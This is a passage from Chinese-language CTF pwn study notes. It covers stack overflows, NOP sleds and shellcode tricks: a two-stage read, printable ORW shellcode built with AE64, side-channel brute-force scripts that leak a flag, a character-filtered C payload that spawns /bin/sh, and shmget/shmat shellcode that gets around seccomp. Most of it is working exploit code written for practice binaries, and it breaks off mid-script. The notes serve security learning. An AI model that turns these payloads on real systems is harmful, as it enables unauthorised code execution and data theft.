</span></span></span></code></pre></div></div><table><thead><tr><th>return address 0x4</th><th></th></tr></thead><tbody><tr><td>previous ebp 0x4</td><td>ebp</td></tr><tr><td>s 0x64</td><td></td></tr><tr><td></td><td>esp</td></tr></tbody></table><ol><li>而 IDA 有的时候不可靠，需要依靠 gdb 动态调试判断真实的 buf 与 ebp 之间的距离</li><li>构造的 payload 使用 gets 函数覆盖 s，ebp 和返回地址，返回地址覆盖为 shellcode 地址，shellcode 由 strncpy 函数从 s 中复制到 bss 段中的 buf2 中；于是返回地址覆盖为 buf2 中 shellcode 地址。</li><li>输入同样的 exp 后执行失败，由于高版本 linux 中程序 bss 段不再默认可执行导致出错，查看方法：</li><li>gdb 中 vmmap 找到对应的 bss 段，buf2 地址为 0x804a080，不可执行</li></ol><img src=/img/pwn_note.zh-cn.assets/17284464998304.png alt=图片无法加载>
<img src=/img/pwn_note.zh-cn.assets/image-20241028230454709.png alt=图片无法加载><blockquote><p>由于服务器一定开启了 ASLR，所以返回地址并不一定得覆盖为 shellcode 地址，因为不能确定所以需要使用【Nop 滑梯】</p></blockquote><p><strong>shellcode 技巧</strong></p><p><strong>① 当前方执行完 read 函数就执行 shellcode，且此时输入极少</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x20240000</span><span class=p>,</span> <span class=mh>0xDuLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>mov</span>     <span class=n>edx</span><span class=p>,</span> <span class=mi>0</span><span class=n>Dh</span>        <span class=p>;</span> <span class=n>nbytes</span>
</span></span><span class=line><span class=cl>	<span class=n>mov</span>     <span class=n>esi</span><span class=p>,</span> <span class=mi>20240000</span><span class=n>h</span>  <span class=p>;</span> <span class=n>buf</span>
</span></span><span class=line><span class=cl>	<span class=n>mov</span>     <span class=n>edi</span><span class=p>,</span> <span class=mi>0</span>          <span class=p>;</span> <span class=n>fd</span>
</span></span><span class=line><span class=cl>	<span class=n>call</span>    <span class=n>_read</span>
</span></span><span class=line><span class=cl><span class=n>MEMORY</span><span class=p>[</span><span class=mh>0xdead</span><span class=p>]();</span>
</span></span><span class=line><span class=cl>	<span class=p>...</span> <span class=c1>// esi和edi未被改变
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>call</span>    <span class=n>rdx</span></span></span></code></pre></div></div><p>可以输入以下绕过：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>bypass</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>	mov rdx, 0x1000
</span></span></span><span class=line><span class=cl><span class=s2>	syscall ; 再次read系统调用再送入一次shellcode执行
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>② 可见字符 Shellcode</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=mi>31</span> <span class=o>||</span> <span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=mi>127</span> <span class=p>)</span> <span class=c1>// 仅允许输入可见字符的Shellcode
</span></span></span></code></pre></div></div><p>使用工具<strong>AE64</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ae64</span> <span class=kn>import</span> <span class=n>AE64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>shellcraft</span> <span class=c1># 使用ORW</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;./flag&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>s</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=mh>0x20240000</span><span class=p>,</span><span class=mi>30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>s</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x20240000</span><span class=p>,</span><span class=mi>30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ss</span> <span class=o>=</span> <span class=n>AE64</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcode</span><span class=p>),</span><span class=s1>&#39;rdx&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;fast&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># arg: shellcode, 寄存器: call rdx, 偏移, 策略:fast or small</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>ss</span><span class=p>)</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 测试
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span><span class=o>=</span><span class=s>&#34;visible_shellcode&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=p>(</span><span class=o>*</span><span class=n>run</span><span class=p>)()</span><span class=o>=</span><span class=p>(</span><span class=kt>void</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>shellcode</span><span class=p>;</span> <span class=c1>//run函数指针,无参无返回值; 将shellcode转换为函数指针
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>run</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><strong>③ 侧信道攻击</strong></p><ul><li>传入极少字节 shellcode，已知 rdi 寄存器存放泄露内容 flag 或已通过 open 与 read 读到 rdi 或 rsp 中</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>j</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>printable</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=n>j</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./elf&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>                xor byte ptr [rdi+</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>], </span><span class=si>{</span><span class=n>j</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>                jz $
</span></span></span><span class=line><span class=cl><span class=s2>            &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>            <span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span> <span class=c1># 6字节</span>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span> <span class=c1># 若猜测正确程序卡死</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;idx: </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>, try: </span><span class=si>{</span><span class=n>j</span><span class=si>}</span><span class=s2>--yes&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span><span class=o>+=</span><span class=nb>str</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span> <span class=c1># 猜测错误则EOF跳出</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span></span></span></code></pre></div></div><p>seccomp 设置关闭了输出流，或白名单形式禁用了输出系统调用</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>check</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>c</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        mov dl, [rsp + </span><span class=si>{}</span><span class=s2>] # 字节爆破, flag已读到rsp中，即栈顶
</span></span></span><span class=line><span class=cl><span class=s2>        cmp dl, </span><span class=si>{}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        jbe $ # 小于等于跳转
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>c</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span> <span class=c1># 未结束无输出超时不触发异常</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>kill</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span> <span class=c1># 若进程已结束触发异常</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>l</span> <span class=o>=</span> <span class=mh>0x20</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=mh>0x7f</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>l</span> <span class=o>&lt;</span> <span class=n>r</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>m</span> <span class=o>=</span> <span class=p>(</span><span class=n>l</span> <span class=o>+</span> <span class=n>r</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span> <span class=c1># 二分查找</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>check</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>m</span><span class=p>):</span> <span class=c1># flag &lt;= m</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>			<span class=c1># m &lt;= flag</span>
</span></span><span class=line><span class=cl>            <span class=n>l</span> <span class=o>=</span> <span class=n>m</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>l</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span></span></span></code></pre></div></div><p><strong>④ 编译绕过</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 禁用: [A-Za-z],&#34;#&#34;,&#34;*&#34;,&#34;[&#34;,&#34;]&#34;,&#34;/&#34;,&#34;=&#34;; &#34;{&#34;和&#34;}&#34;数量各为1</span>
</span></span><span class=line><span class=cl><span class=c1># 可包含: &#34;_() {&#34;</span>
</span></span><span class=line><span class=cl><span class=n>src_path</span> <span class=o>=</span> <span class=s2>&#34;test.c&#34;</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>src_path</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>input_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># kali中成功编译</span>
</span></span><span class=line><span class=cl><span class=n>returncode</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>call</span><span class=p>([</span><span class=s2>&#34;gcc&#34;</span><span class=p>,</span> <span class=s2>&#34;-B/usr/bin&#34;</span><span class=p>,</span> <span class=s2>&#34;-Wl,--entry=_&#34;</span> <span class=p>,</span><span class=s2>&#34;-nostartfiles&#34;</span><span class=p>,</span> <span class=s2>&#34;-w&#34;</span><span class=p>,</span> <span class=s2>&#34;-O0&#34;</span><span class=p>,</span> <span class=s2>&#34;-o&#34;</span><span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>,</span> <span class=n>src_path</span><span class=p>],</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># -B/usr/bin 查找可执行文件、库和头文件的路径</span>
</span></span><span class=line><span class=cl><span class=c1># -Wl,--entry=_ 传递给链接器, 入口从_开始</span>
</span></span><span class=line><span class=cl><span class=c1># -nostartfiles 不运行标准初始化操作, 用于编写内核或固件等系统软件</span>
</span></span><span class=line><span class=cl><span class=c1># -w不显示警告信息 -O0不进行任何优化</span>
</span></span><span class=line><span class=cl><span class=n>compiled_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>(),</span> <span class=s2>&#34;test&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=n>compiled_path</span><span class=p>])</span></span></span></code></pre></div></div><p>实际调试发现<code>gcc -nostartfiles -o test source.c</code>即可达成效果，构造 payload</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>_</span><span class=p>()</span> <span class=p>{(</span><span class=o>&amp;</span><span class=n>_</span> <span class=o>+</span> <span class=mi>41</span><span class=p>)(</span><span class=mi>1852400175</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>6845231</span><span class=p>);</span><span class=nf>_</span><span class=p>(</span><span class=mi>19701566652744</span><span class=p>);</span><span class=nf>_</span><span class=p>(</span><span class=mi>81265623368</span><span class=p>);</span><span class=nf>_</span><span class=p>(</span><span class=mi>81258304599</span><span class=p>);</span><span class=nf>_</span><span class=p>(</span><span class=mi>5561986562150</span><span class=p>);}</span>
</span></span><span class=line><span class=cl><span class=c1>// &amp;_: 函数的地址
</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>_</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// &lt;_&gt;		push rbp
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+1&gt;	mov rbp, rsp
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>(</span><span class=o>&amp;</span><span class=n>_</span> <span class=o>+</span> <span class=mi>41</span><span class=p>)(</span><span class=mi>1852400175</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>6845231</span><span class=p>);</span> 		<span class=c1>// 将/bin/sh分别装入rdi和rcx
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+4&gt;	lea r8, [rip + 1eh]  0x1e+11=41
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+11&gt;	mov ecx, 68732fh ;&#34;/sh&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+16&gt;	mov edx, 0
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+21&gt;	mov esi, 0
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+26&gt;	mov edi, 6e69622fh;&#34;/bin&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+31&gt;	mov eax, 0
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+36&gt;	call r8
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>_</span><span class=p>(</span><span class=mi>19701566652744</span><span class=p>);</span> <span class=c1>// 0x11eb20e1c148
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+41&gt;	shl rcx, 20h	rcx:0x68732f00000000 48 c1 e1 20
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+45&gt;	jmp $+19; _+64	eb 11
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>_</span><span class=p>(</span><span class=mi>81265623368</span><span class=p>);</span> <span class=c1>// 0x12ebcf0148
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+64&gt;	add rdi, rcx	rdi:0x68732f6e69622f &#39;/bin/sh&#39;	48 01 cf
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+67&gt;	jmp $+20; _+87	eb 12
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>_</span><span class=p>(</span><span class=mi>81258304599</span><span class=p>);</span> <span class=c1>// 0x12eb5f5457
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+87&gt;	push rdi	将/bin/sh推入栈顶	57
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+88&gt;	push rsp	将栈顶地址(/bin/sh地址)推入栈顶	54
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+89&gt;	pop rdi		rdi存/bin/sh地址	5f
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+90&gt;	jmp $+20; _+110	eb 12
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>_</span><span class=p>(</span><span class=mi>5561986562150</span><span class=p>);</span> <span class=c1>// 0x50f003bb866
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+110&gt;	mov ax, 3bh	66 b8 3b 00
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// &lt;_+114&gt;	syscall	0f 05
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span></span></span></code></pre></div></div><p><strong>⑤ shmget, shmat</strong></p><p>共享内存相关系统调用</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	创建共享内存
</span></span></span><span class=line><span class=cl><span class=cm>	size: 大小四舍五入到PAGE_SIZE的倍数
</span></span></span><span class=line><span class=cl><span class=cm>	shmflg: 权限标志 设置777
</span></span></span><span class=line><span class=cl><span class=cm>	ret: 返回共享内存的标识
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>shmget</span><span class=p>(</span><span class=kt>key_t</span> <span class=n>key</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>size</span><span class=p>,</span> <span class=kt>int</span> <span class=n>shmflg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	共享内存创建无法被任何进程访问，shmat用来启动对该共享内存的访问，将其连接到当前进程地址空间
</span></span></span><span class=line><span class=cl><span class=cm>	shm_id: shmget返回的标识
</span></span></span><span class=line><span class=cl><span class=cm>	shm_addr: 指定当前进程中地址位置，空标识系统选择
</span></span></span><span class=line><span class=cl><span class=cm>	shmflg: 标志位，可执行位SHM_EXEC:0x8000, #include &lt;sys/shm.h&gt;输出获取其值
</span></span></span><span class=line><span class=cl><span class=cm>	ret: 成功返回指向共享内存指针，失败返回-1
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=nf>shmat</span><span class=p>(</span><span class=kt>int</span> <span class=n>shm_id</span><span class=p>,</span> <span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=n>shm_addr</span><span class=p>,</span> <span class=kt>int</span> <span class=n>shmflg</span><span class=p>);</span></span></span></code></pre></div></div><ul><li>清除了所有寄存器包括 fs/gs，常用寄存器均为垃圾数据，shellcode 限制长度</li><li>seccomp 禁用<code>mmap/mprotect/brk/execve/execveat</code>，使用共享内存 syscall 可以分多段利用</li><li>需要保证 shm_id 正确对应新申请出的共享内存，初始从 0 开始，可通过<code>ipcs -m</code>查看</li></ul><div class="code-block code-line-numbers" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># size:15</span>
</span></span><span class=line><span class=cl><span class=n>shell1</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span>\
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>shl eax, 28 ; 清空eax
</span></span></span><span class=line><span class=cl><span class=s2>jo $-0x30   ; 返回前段代码执行一系列操作将其余寄存器置0(省略)
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x1d /* shmget */
</span></span></span><span class=line><span class=cl><span class=s2>inc esi
</span></span></span><span class=line><span class=cl><span class=s2>mov dx, 0777
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># size:15</span>
</span></span><span class=line><span class=cl><span class=n>shell2</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span>\
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>shl eax, 28
</span></span></span><span class=line><span class=cl><span class=s2>jo $-0x30
</span></span></span><span class=line><span class=cl><span class=s2>mov dh, 0x80 ; SHM_EXEC
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x1e /* shmat */
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>xchg rsi, rax /* SYS_read 交换rsi和rax的值*/
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># size:13</span>
</span></span><span class=line><span class=cl><span class=n>shell3</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span>\
